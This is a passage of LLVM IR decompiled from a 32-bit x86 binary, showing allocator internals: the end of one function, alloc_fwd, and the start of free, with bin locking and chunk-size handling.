  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 22, 20, 21, 23, 24, 25, 26, 27, 30, 28, 29, 31 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a18c, { 1, 0 }
  uselistorder label %dec_label_pc_804a161, { 1, 0 }
  uselistorder label %dec_label_pc_804a142, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a0d7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804a0a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a030, { 1, 0 }
}

define i32 @alloc_fwd() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_804a270 = load i32, i32* @ebp, align 4
  %v0_804a271 = load i32, i32* @edi, align 4
  %v0_804a272 = load i32, i32* @esi, align 4
  %v0_804a273 = load i32, i32* @ebx, align 4
  %v0_804a277 = load i32, i32* @eax, align 4
  %v1_804a27b = add i32 %v0_804a277, 4
  %v2_804a27b = inttoptr i32 %v1_804a27b to i32*
  %v3_804a27b = load i32, i32* %v2_804a27b, align 4
  store i32 %v3_804a27b, i32* %eax.global-to-local, align 4
  %v5_804a27e = trunc i32 %v3_804a27b to i8
  store i32 %v3_804a27b, i32* %esi.global-to-local, align 4
  %v6_804a284 = urem i8 %v5_804a27e, 2
  %v7_804a284 = icmp eq i8 %v6_804a284, 0
  %v1_804a289 = icmp eq i1 %v7_804a284, false
  br i1 %v1_804a289, label %dec_label_pc_804a3ad, label %dec_label_pc_804a290

dec_label_pc_804a290:                             ; preds = %entry, %dec_label_pc_804a39e
  %stack_var_-36.0 = phi i32 [ %v0_804a39e, %dec_label_pc_804a39e ], [ %v3_804a27b, %entry ]
  %sext43 = shl i32 %stack_var_-36.0, 24
  %v4_804a290 = ashr exact i32 %sext43, 24
  %v2_804a294 = udiv i32 %v4_804a290, 16
  %v1_804a297 = add nsw i32 %v2_804a294, -1
  store i32 %v1_804a297, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804a297, 33
  br i1 %tmp42, label %dec_label_pc_804a2d0, label %dec_label_pc_804a2a3

dec_label_pc_804a2a3:                             ; preds = %dec_label_pc_804a290
  %v6_804a2b0 = icmp ugt i32 %v1_804a297, 7168
  br i1 %v6_804a2b0, label %dec_label_pc_804a2d0, label %dec_label_pc_804a2b2

dec_label_pc_804a2b2:                             ; preds = %dec_label_pc_804a2a3
  %tmp = sitofp i32 %v1_804a297 to float
  %v4_804a2bd = bitcast float %tmp to i32
  %v2_804a2c1 = udiv i32 %v4_804a2bd, 2097152
  %v1_804a2c4 = add nsw i32 %v2_804a2c1, -496
  store i32 %v1_804a2c4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a2d0

dec_label_pc_804a2d0:                             ; preds = %dec_label_pc_804a2a3, %dec_label_pc_804a290, %dec_label_pc_804a2b2
  %stack_var_-40.0 = phi i32 [ %v1_804a297, %dec_label_pc_804a290 ], [ 63, %dec_label_pc_804a2a3 ], [ %v1_804a2c4, %dec_label_pc_804a2b2 ]
  %sext = mul i32 %stack_var_-40.0, 16777216
  %v0_804a2d4 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804a2d4, i32* %eax.global-to-local, align 4
  store i32 %v4_804a290, i32* %ecx.global-to-local, align 4
  %v2_804a2dd = sdiv i32 %sext, 1048576
  store i32 %v2_804a2dd, i32* %edx.global-to-local, align 4
  %v1_804a2e0 = add i32 %v2_804a2dd, ptrtoint (i32* @global_var_80569c0.334 to i32)
  %v1_804a2e6 = icmp eq i32 %v0_804a2d4, 0
  %v1_804a2e8 = add i32 %v2_804a2dd, add (i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32 8)
  store i32 %v1_804a2e8, i32* @edi, align 4
  br i1 %v1_804a2e6, label %dec_label_pc_804a338, label %dec_label_pc_804a2ed

dec_label_pc_804a2ed:                             ; preds = %dec_label_pc_804a2d0
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a2f2 = inttoptr i32 %v1_804a2e8 to i32*
  %v3_804a2f2 = load i32, i32* %v2_804a2f2, align 4
  store i32 1, i32* %v2_804a2f2, align 4
  store i32 %v3_804a2f2, i32* %eax.global-to-local, align 4
  %v1_804a2f5 = icmp eq i32 %v3_804a2f2, 0
  br i1 %v1_804a2f5, label %dec_label_pc_804a32f, label %dec_label_pc_804a2f9

dec_label_pc_804a2f9:                             ; preds = %dec_label_pc_804a2ed
  %v0_804a2f9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804a2f9, i32* @esi, align 4
  %v1_804a2fb = add i32 %v0_804a2f9, ptrtoint (i32* @global_var_80569cc.336 to i32)
  store i32 %v1_804a2fb, i32* @ebx, align 4
  br label %dec_label_pc_804a301

dec_label_pc_804a301:                             ; preds = %dec_label_pc_804a301.dec_label_pc_804a301_crit_edge, %dec_label_pc_804a2f9
  %v0_804a311 = phi i32 [ %v0_804a311.pre, %dec_label_pc_804a301.dec_label_pc_804a301_crit_edge ], [ %v1_804a2fb, %dec_label_pc_804a2f9 ]
  %v0_804a315 = load i32, i32* @edi, align 4
  store i32 %v0_804a315, i32* %stack_var_-60, align 4
  %v4_804a318 = inttoptr i32 %v0_804a315 to i32*
  %v5_804a318 = call i32 @__wait(i32* %v4_804a318, i32 %v0_804a311, i32 1)
  %v0_804a31d = load i32, i32* @esi, align 4
  %v1_804a31d = add i32 %v0_804a31d, ptrtoint (i32* @global_var_80569c0.334 to i32)
  store i32 %v1_804a31d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804a328 = add i32 %v0_804a31d, add (i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32 8)
  %v2_804a328 = inttoptr i32 %v1_804a328 to i32*
  %v3_804a328 = load i32, i32* %v2_804a328, align 4
  store i32 1, i32* %v2_804a328, align 4
  store i32 %v3_804a328, i32* %eax.global-to-local, align 4
  %v1_804a32b = icmp eq i32 %v3_804a328, 0
  %v1_804a32d = icmp eq i1 %v1_804a32b, false
  br i1 %v1_804a32d, label %dec_label_pc_804a301.dec_label_pc_804a301_crit_edge, label %dec_label_pc_804a32f

dec_label_pc_804a301.dec_label_pc_804a301_crit_edge: ; preds = %dec_label_pc_804a301
  %v0_804a311.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a301

dec_label_pc_804a32f:                             ; preds = %dec_label_pc_804a301, %dec_label_pc_804a2ed
  store i32 %v0_804a277, i32* %eax.global-to-local, align 4
  %v3_804a333 = load i32, i32* %v2_804a27b, align 4
  store i32 %v3_804a333, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a333, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a338

dec_label_pc_804a338:                             ; preds = %dec_label_pc_804a2d0, %dec_label_pc_804a32f
  %v0_804a3b7 = phi i32 [ %v4_804a290, %dec_label_pc_804a2d0 ], [ %v3_804a333, %dec_label_pc_804a32f ]
  store i32 %v2_804a2dd, i32* @ebp, align 4
  %v1_804a33f = add i32 %v2_804a2dd, ptrtoint (i32* @global_var_80569d0.337 to i32)
  %v2_804a33f = inttoptr i32 %v1_804a33f to i32*
  %v3_804a33f = load i32, i32* %v2_804a33f, align 4
  store i32 %v1_804a2e0, i32* %edi.global-to-local, align 4
  %v1_804a34b = icmp eq i32 %v3_804a33f, 0
  %v16_804a3b7 = icmp eq i32 %v0_804a3b7, %v4_804a290
  br i1 %v1_804a34b, label %dec_label_pc_804a3b7, label %dec_label_pc_804a34f

dec_label_pc_804a34f:                             ; preds = %dec_label_pc_804a338
  br i1 %v16_804a3b7, label %dec_label_pc_804a3cc, label %dec_label_pc_804a355

dec_label_pc_804a355:                             ; preds = %dec_label_pc_804a3b7.dec_label_pc_804a355_crit_edge, %dec_label_pc_804a34f
  %v1_804a361 = phi i32 [ %v0_804a355.pre, %dec_label_pc_804a3b7.dec_label_pc_804a355_crit_edge ], [ %v1_804a2e0, %dec_label_pc_804a34f ]
  %v1_804a355 = add i32 %v1_804a361, 8
  %v2_804a355 = inttoptr i32 %v1_804a355 to i32*
  %v3_804a355 = load i32, i32* %v2_804a355, align 4
  store i32 %v3_804a355, i32* %eax.global-to-local, align 4
  store i32 %v1_804a355, i32* @edx, align 4
  %v1_804a35b = icmp eq i32 %v3_804a355, 0
  br i1 %v1_804a35b, label %dec_label_pc_804a355.dec_label_pc_804a39e_crit_edge, label %dec_label_pc_804a35f

dec_label_pc_804a355.dec_label_pc_804a39e_crit_edge: ; preds = %dec_label_pc_804a355
  %v0_804a39e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a39e

dec_label_pc_804a35f:                             ; preds = %dec_label_pc_804a355
  store i32 0, i32* %v2_804a355, align 4
  %v2_804a364 = load i32, i32* %stack_var_-60, align 4
  %v0_804a369 = load i32, i32* @ebp, align 4
  %v1_804a369 = add i32 %v0_804a369, ptrtoint (i32* @global_var_80569c4.335 to i32)
  store i32 %v1_804a369, i32* %eax.global-to-local, align 4
  %v1_804a36f = add i32 %v0_804a369, add (i32 ptrtoint (i32* @global_var_80569c4.335 to i32), i32 8)
  %v2_804a36f = inttoptr i32 %v1_804a36f to i32*
  %v3_804a36f = load i32, i32* %v2_804a36f, align 4
  store i32 %v3_804a36f, i32* %eax.global-to-local, align 4
  %v1_804a372 = icmp eq i32 %v3_804a36f, 0
  br i1 %v1_804a372, label %dec_label_pc_804a395, label %dec_label_pc_804a376

dec_label_pc_804a376:                             ; preds = %dec_label_pc_804a35f
  store i32 240, i32* @ebx, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804a387 = call i32 @__vsyscall(i32 %v2_804a364)
  store i32 %v1_804a387, i32* %eax.global-to-local, align 4
  %v10_804a38c = icmp eq i32 %v1_804a387, -38
  br i1 %v10_804a38c, label %dec_label_pc_804a43e, label %dec_label_pc_804a395

dec_label_pc_804a395:                             ; preds = %dec_label_pc_804a376, %dec_label_pc_804a35f, %dec_label_pc_804a43e
  store i32 %v0_804a277, i32* %eax.global-to-local, align 4
  %v3_804a399 = load i32, i32* %v2_804a27b, align 4
  store i32 %v3_804a399, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a399, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a39e

dec_label_pc_804a39e:                             ; preds = %dec_label_pc_804a355.dec_label_pc_804a39e_crit_edge, %dec_label_pc_804a395
  %v0_804a39e = phi i32 [ %v0_804a39e.pre, %dec_label_pc_804a355.dec_label_pc_804a39e_crit_edge ], [ %v3_804a399, %dec_label_pc_804a395 ]
  %v5_804a39e = trunc i32 %v0_804a39e to i8
  %v6_804a3a2 = urem i8 %v5_804a39e, 2
  %v7_804a3a2 = icmp eq i8 %v6_804a3a2, 0
  br i1 %v7_804a3a2, label %dec_label_pc_804a290, label %dec_label_pc_804a3ad

dec_label_pc_804a3ad:                             ; preds = %dec_label_pc_804a39e, %entry
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v0_804a273, i32* @ebx, align 4
  store i32 %v0_804a272, i32* @esi, align 4
  store i32 %v0_804a271, i32* @edi, align 4
  store i32 %v0_804a270, i32* @ebp, align 4
  ret i32 0

dec_label_pc_804a3b7:                             ; preds = %dec_label_pc_804a338
  store i32 %v1_804a2e8, i32* %eax.global-to-local, align 4
  %v2_804a3be = add i32 %v2_804a2dd, ptrtoint (i32* @global_var_80569d4.338 to i32)
  %v3_804a3be = inttoptr i32 %v2_804a3be to i32*
  store i32 %v1_804a2e8, i32* %v3_804a3be, align 4
  %v0_804a3c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3c4 = load i32, i32* @ebp, align 4
  %v2_804a3c4 = add i32 %v1_804a3c4, ptrtoint (i32* @global_var_80569d0.337 to i32)
  %v3_804a3c4 = inttoptr i32 %v2_804a3c4 to i32*
  store i32 %v0_804a3c4, i32* %v3_804a3c4, align 4
  %v1_804a3ca = icmp eq i1 %v16_804a3b7, false
  br i1 %v1_804a3ca, label %dec_label_pc_804a3b7.dec_label_pc_804a355_crit_edge, label %dec_label_pc_804a3cc

dec_label_pc_804a3b7.dec_label_pc_804a355_crit_edge: ; preds = %dec_label_pc_804a3b7
  %v0_804a355.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804a355

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a3b7, %dec_label_pc_804a34f
  %v4_804a2d0.le = sdiv i32 %sext, 16777216
  store i32 %v0_804a277, i32* %ecx.global-to-local, align 4
  %v1_804a3d0 = add i32 %v0_804a277, 12
  %v2_804a3d0 = inttoptr i32 %v1_804a3d0 to i32*
  %v3_804a3d0 = load i32, i32* %v2_804a3d0, align 4
  store i32 %v3_804a3d0, i32* %edx.global-to-local, align 4
  %v2_804a3d3 = add i32 %v0_804a277, 8
  %v3_804a3d3 = inttoptr i32 %v2_804a3d3 to i32*
  %v4_804a3d3 = load i32, i32* %v3_804a3d3, align 4
  %v15_804a3d3 = icmp eq i32 %v3_804a3d0, %v4_804a3d3
  br i1 %v15_804a3d3, label %dec_label_pc_804a462, label %dec_label_pc_804a3cc.dec_label_pc_804a3dc_crit_edge

dec_label_pc_804a3cc.dec_label_pc_804a3dc_crit_edge: ; preds = %dec_label_pc_804a3cc
  %v0_804a3df.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a3dc

dec_label_pc_804a3dc:                             ; preds = %dec_label_pc_804a3cc.dec_label_pc_804a3dc_crit_edge, %.thread
  %v0_804a3df = phi i32 [ %v0_804a3df.pre, %dec_label_pc_804a3cc.dec_label_pc_804a3dc_crit_edge ], [ %v3_804a494, %.thread ]
  %v3_804a3dc = phi i32 [ %v4_804a3d3, %dec_label_pc_804a3cc.dec_label_pc_804a3dc_crit_edge ], [ %v3_804a3dc.pre, %.thread ]
  store i32 %v3_804a3dc, i32* %eax.global-to-local, align 4
  %v1_804a3df = or i32 %v0_804a3df, 1
  store i32 %v1_804a3df, i32* %esi.global-to-local, align 4
  store i32 %v1_804a3df, i32* %v2_804a27b, align 4
  %v0_804a3e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a3e5 = and i32 %v0_804a3e5, -2
  store i32 %v1_804a3e5, i32* %esi.global-to-local, align 4
  %v1_804a3e8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a3e8 = add i32 %v1_804a3e8, %v1_804a3e5
  %v3_804a3e8 = inttoptr i32 %v2_804a3e8 to i32*
  %v4_804a3e8 = load i32, i32* %v3_804a3e8, align 4
  %v5_804a3e8 = or i32 %v4_804a3e8, 1
  store i32 %v5_804a3e8, i32* %v3_804a3e8, align 4
  %v0_804a3ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3ec = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3ec = add i32 %v1_804a3ec, 8
  %v3_804a3ec = inttoptr i32 %v2_804a3ec to i32*
  store i32 %v0_804a3ec, i32* %v3_804a3ec, align 4
  %v0_804a3ef = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a3ef = add i32 %v0_804a3ef, 8
  %v2_804a3ef = inttoptr i32 %v1_804a3ef to i32*
  %v3_804a3ef = load i32, i32* %v2_804a3ef, align 4
  store i32 %v3_804a3ef, i32* %eax.global-to-local, align 4
  %v0_804a3f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3f2 = add i32 %v3_804a3ef, 12
  %v3_804a3f2 = inttoptr i32 %v2_804a3f2 to i32*
  store i32 %v0_804a3f2, i32* %v3_804a3f2, align 4
  %v0_804a3f5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804a3f5 = add i32 %v0_804a3f5, 8
  %v2_804a3f5 = inttoptr i32 %v1_804a3f5 to i32*
  %v3_804a3f5 = load i32, i32* %v2_804a3f5, align 4
  store i32 %v3_804a3f5, i32* %eax.global-to-local, align 4
  store i32 %v1_804a3f5, i32* @edx, align 4
  %v1_804a3fb = icmp eq i32 %v3_804a3f5, 0
  br i1 %v1_804a3fb, label %dec_label_pc_804a431, label %dec_label_pc_804a3ff

dec_label_pc_804a3ff:                             ; preds = %dec_label_pc_804a3dc
  store i32 0, i32* %v2_804a3f5, align 4
  %v2_804a404 = load i32, i32* %stack_var_-60, align 4
  %v0_804a409 = load i32, i32* @ebp, align 4
  %v1_804a409 = add i32 %v0_804a409, ptrtoint (i32* @global_var_80569c4.335 to i32)
  store i32 %v1_804a409, i32* %eax.global-to-local, align 4
  %v1_804a40f = add i32 %v0_804a409, add (i32 ptrtoint (i32* @global_var_80569c4.335 to i32), i32 8)
  %v2_804a40f = inttoptr i32 %v1_804a40f to i32*
  %v3_804a40f = load i32, i32* %v2_804a40f, align 4
  store i32 %v3_804a40f, i32* %eax.global-to-local, align 4
  %v1_804a412 = icmp eq i32 %v3_804a40f, 0
  br i1 %v1_804a412, label %dec_label_pc_804a431, label %dec_label_pc_804a416

dec_label_pc_804a416:                             ; preds = %dec_label_pc_804a3ff
  store i32 240, i32* @ebx, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804a427 = call i32 @__vsyscall(i32 %v2_804a404)
  store i32 %v1_804a427, i32* %eax.global-to-local, align 4
  %v10_804a42c = icmp eq i32 %v1_804a427, -38
  br i1 %v10_804a42c, label %dec_label_pc_804a44c, label %dec_label_pc_804a431

dec_label_pc_804a431:                             ; preds = %dec_label_pc_804a416, %dec_label_pc_804a3ff, %dec_label_pc_804a3dc
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v0_804a273, i32* @ebx, align 4
  store i32 %v0_804a272, i32* @esi, align 4
  store i32 %v0_804a271, i32* @edi, align 4
  store i32 %v0_804a270, i32* @ebp, align 4
  ret i32 1

dec_label_pc_804a43e:                             ; preds = %dec_label_pc_804a376
  %v0_804a43e = load i32, i32* @ebx, align 4
  store i32 %v0_804a43e, i32* @eax, align 4
  %v0_804a440 = load i32, i32* @edi, align 4
  store i32 %v0_804a440, i32* %ecx.global-to-local, align 4
  %v0_804a442 = load i32, i32* %stack_var_-60, align 4
  %v1_804a442 = call i32 @__vsyscall(i32 %v0_804a442)
  store i32 %v1_804a442, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a395

dec_label_pc_804a44c:                             ; preds = %dec_label_pc_804a416
  %v0_804a44c = load i32, i32* @ebx, align 4
  store i32 %v0_804a44c, i32* @eax, align 4
  %v0_804a44e = load i32, i32* @edi, align 4
  store i32 %v0_804a44e, i32* %ecx.global-to-local, align 4
  %v0_804a450 = load i32, i32* %stack_var_-60, align 4
  %v1_804a450 = call i32 @__vsyscall(i32 %v0_804a450)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v0_804a273, i32* @ebx, align 4
  store i32 %v0_804a272, i32* @esi, align 4
  store i32 %v0_804a271, i32* @edi, align 4
  store i32 %v0_804a270, i32* @ebp, align 4
  ret i32 1

dec_label_pc_804a462:                             ; preds = %dec_label_pc_804a3cc
  store i32 %v4_804a2d0.le, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32* %esi.global-to-local, align 4
  %v2_804a470 = and i32 %v4_804a2d0.le, 32
  %v3_804a470 = icmp eq i32 %v2_804a470, 0
  %v1_804a473 = icmp eq i1 %v3_804a470, false
  %v2_804a473 = zext i1 %v1_804a473 to i32
  store i32 %v2_804a473, i32* %edx.global-to-local, align 4
  %v1_804a476 = zext i1 %v3_804a470 to i32
  store i32 %v1_804a476, i32* %eax.global-to-local, align 4
  %v2_804a479 = urem i32 %v4_804a2d0.le, 32
  %v4_804a479 = icmp eq i32 %v2_804a479, 0
  br i1 %v4_804a479, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_804a462
  %v5_804a479 = shl i32 %v2_804a473, %v2_804a479
  store i32 %v5_804a479, i32* %edx.global-to-local, align 4
  %v5_804a47b = shl i32 %v1_804a476, %v2_804a479
  store i32 %v5_804a47b, i32* %eax.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_804a462, %bb
  %v0_804a47d26 = phi i32 [ %v5_804a479, %bb ], [ %v2_804a473, %dec_label_pc_804a462 ]
  %v0_804a481 = phi i32 [ %v5_804a47b, %bb ], [ %v1_804a476, %dec_label_pc_804a462 ]
  %v1_804a47d = sub i32 -1, %v0_804a47d26
  store i32 %v1_804a47d, i32* %edx.global-to-local, align 4
  %v1_804a481 = sub i32 -1, %v0_804a481
  store i32 %v1_804a47d, i32* %ecx.global-to-local, align 4
  %v2_804a489 = load i32, i32* @global_var_80569c0.334, align 4
  %v4_804a489 = and i32 %v2_804a489, %v1_804a481
  store i32 %v4_804a489, i32* @global_var_80569c0.334, align 4
  %v3_804a48c = load i32, i32* @global_var_80569c4.335, align 4
  %v5_804a48c = and i32 %v3_804a48c, %v1_804a47d
  store i32 %v5_804a48c, i32* @global_var_80569c4.335, align 4
  store i32 %v0_804a277, i32* %eax.global-to-local, align 4
  %v3_804a494 = load i32, i32* %v2_804a27b, align 4
  store i32 %v3_804a494, i32* %esi.global-to-local, align 4
  store i32 %v0_804a277, i32* %ecx.global-to-local, align 4
  %v3_804a499 = load i32, i32* %v2_804a3d0, align 4
  store i32 %v3_804a499, i32* %edx.global-to-local, align 4
  %v3_804a3dc.pre = load i32, i32* %v3_804a3d3, align 4
  br label %dec_label_pc_804a3dc

; uselistorder directives
  uselistorder i32 %v3_804a494, { 1, 0 }
  uselistorder i32 %v1_804a47d, { 2, 1, 0 }
  uselistorder i32 %v2_804a479, { 2, 1, 0 }
  uselistorder i32 %v4_804a3d3, { 1, 0 }
  uselistorder i32 %v0_804a39e, { 1, 0 }
  uselistorder i1 %v16_804a3b7, { 1, 0 }
  uselistorder i32 %v1_804a2e8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804a2dd, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v1_804a297, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v4_804a290, { 0, 2, 1, 3 }
  uselistorder i32* %v2_804a27b, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_804a277, { 2, 1, 5, 4, 3, 6, 0, 7 }
  uselistorder i32 %v0_804a273, { 2, 1, 0 }
  uselistorder i32 %v0_804a272, { 2, 1, 0 }
  uselistorder i32 %v0_804a271, { 2, 1, 0 }
  uselistorder i32 %v0_804a270, { 2, 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 5, 4, 10, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 20, 17, 18, 19, 21, 22, 23, 24, 27, 25, 26, 28, 29 }
  uselistorder i32 ptrtoint (i32* @global_var_80569c4.335 to i32), { 1, 0, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32 8), { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804a3dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a39e, { 1, 0 }
  uselistorder label %dec_label_pc_804a395, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a338, { 1, 0 }
  uselistorder label %dec_label_pc_804a2d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a290, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_804a4b0 = load i32, i32* @ebp, align 4
  %v0_804a4b1 = load i32, i32* @edi, align 4
  %v0_804a4b2 = load i32, i32* @esi, align 4
  %v0_804a4b3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804a4bb = icmp eq i32 %arg1, 0
  br i1 %v1_804a4bb, label %entry.dec_label_pc_804a710_crit_edge, label %dec_label_pc_804a4c3

entry.dec_label_pc_804a710_crit_edge:             ; preds = %entry
  %v0_804a717.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804a710

dec_label_pc_804a4c3:                             ; preds = %entry
  %v1_804a4c3 = add i32 %arg1, -8
  store i32 %v1_804a4c3, i32* @ebp, align 4
  %v1_804a4c6 = add i32 %arg1, -4
  %v2_804a4c6 = inttoptr i32 %v1_804a4c6 to i32*
  %v3_804a4c6 = load i32, i32* %v2_804a4c6, align 4
  store i32 %v3_804a4c6, i32* %eax.global-to-local, align 4
  %v2_804a4c9 = urem i32 %v3_804a4c6, 2
  %v3_804a4c9 = icmp eq i32 %v2_804a4c9, 0
  br i1 %v3_804a4c9, label %dec_label_pc_804a6f4, label %dec_label_pc_804a4d1

dec_label_pc_804a4d1:                             ; preds = %dec_label_pc_804a4c3
  %v1_804a4d3 = and i32 %v3_804a4c6, -2
  %v2_804a4da = add i32 %v1_804a4d3, %v1_804a4c3
  store i32 %v2_804a4da, i32* %edx.global-to-local, align 4
  store i32 %v1_804a4d3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a4f5.outer

dec_label_pc_804a4f5.outer:                       ; preds = %dec_label_pc_804a6e7, %dec_label_pc_804a4d1
  %stack_var_-48.0.ph = phi i32 [ %v5_804a6e7, %dec_label_pc_804a6e7 ], [ %v1_804a4d3, %dec_label_pc_804a4d1 ]
  %stack_var_-40.0.ph = phi i32 [ %stack_var_-40.2, %dec_label_pc_804a6e7 ], [ 0, %dec_label_pc_804a4d1 ]
  %stack_var_-52.0.ph = phi i32 [ %v5_804a6eb, %dec_label_pc_804a6e7 ], [ %v2_804a4da, %dec_label_pc_804a4d1 ]
  %v2_804a4fc = add i32 %stack_var_-52.0.ph, 4
  %v3_804a4fc = inttoptr i32 %v2_804a4fc to i32*
  br label %dec_label_pc_804a4f5

dec_label_pc_804a4f5:                             ; preds = %dec_label_pc_804a4f5.outer, %dec_label_pc_804a6b0
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_804a6b0 ], [ %stack_var_-48.0.ph, %dec_label_pc_804a4f5.outer ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.1, %dec_label_pc_804a6b0 ], [ %stack_var_-40.0.ph, %dec_label_pc_804a4f5.outer ]
  store i32 %stack_var_-52.0.ph, i32* %edx.global-to-local, align 4
  %v0_804a4f9 = load i32, i32* @ebp, align 4
  %v1_804a4f9 = inttoptr i32 %v0_804a4f9 to i32*
  %v2_804a4f9 = load i32, i32* %v1_804a4f9, align 4
  store i32 %v2_804a4f9, i32* %eax.global-to-local, align 4
  %v4_804a4fc = load i32, i32* %v3_804a4fc, align 4
  %v5_804a4fc = and i32 %v4_804a4fc, %v2_804a4f9
  store i32 %v5_804a4fc, i32* %eax.global-to-local, align 4
  %v2_804a4ff = urem i32 %v5_804a4fc, 2
  %v3_804a4ff = icmp eq i32 %v2_804a4ff, 0
  br i1 %v3_804a4ff, label %dec_label_pc_804a677, label %dec_label_pc_804a507

dec_label_pc_804a507:                             ; preds = %dec_label_pc_804a4f5
  %v1_804a50b = or i32 %stack_var_-48.0, 1
  store i32 %v1_804a50b, i32* %eax.global-to-local, align 4
  %v2_804a50e = add i32 %v0_804a4f9, 4
  %v3_804a50e = inttoptr i32 %v2_804a50e to i32*
  store i32 %v1_804a50b, i32* %v3_804a50e, align 4
  %v0_804a511 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a511 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a511 = inttoptr i32 %v1_804a511 to i32*
  store i32 %v0_804a511, i32* %v2_804a511, align 4
  %v2_804a517 = udiv i32 %stack_var_-48.0, 16
  %v1_804a51a = add nsw i32 %v2_804a517, -1
  store i32 %v1_804a51a, i32* %eax.global-to-local, align 4
  %tmp55 = icmp ult i32 %v1_804a51a, 33
  br i1 %tmp55, label %dec_label_pc_804a550, label %dec_label_pc_804a526

dec_label_pc_804a526:                             ; preds = %dec_label_pc_804a507
  %tmp56 = icmp ult i32 %v1_804a51a, 7169
  br i1 %tmp56, label %dec_label_pc_804a535, label %dec_label_pc_804a550

dec_label_pc_804a535:                             ; preds = %dec_label_pc_804a526
  %tmp = sitofp i32 %v1_804a51a to float
  %v4_804a540 = bitcast float %tmp to i32
  %v2_804a544 = udiv i32 %v4_804a540, 2097152
  %v1_804a547 = add nsw i32 %v2_804a544, -496
  store i32 %v1_804a547, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a550

dec_label_pc_804a550:                             ; preds = %dec_label_pc_804a526, %dec_label_pc_804a507, %dec_label_pc_804a535
  %stack_var_-36.0 = phi i32 [ %v1_804a51a, %dec_label_pc_804a507 ], [ %v1_804a547, %dec_label_pc_804a535 ], [ 63, %dec_label_pc_804a526 ]
  %sext = mul i32 %stack_var_-36.0, 16777216
  %v0_804a554 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804a554, i32* %eax.global-to-local, align 4
  %v2_804a559 = sdiv i32 %sext, 1048576
  store i32 %v2_804a559, i32* %edx.global-to-local, align 4
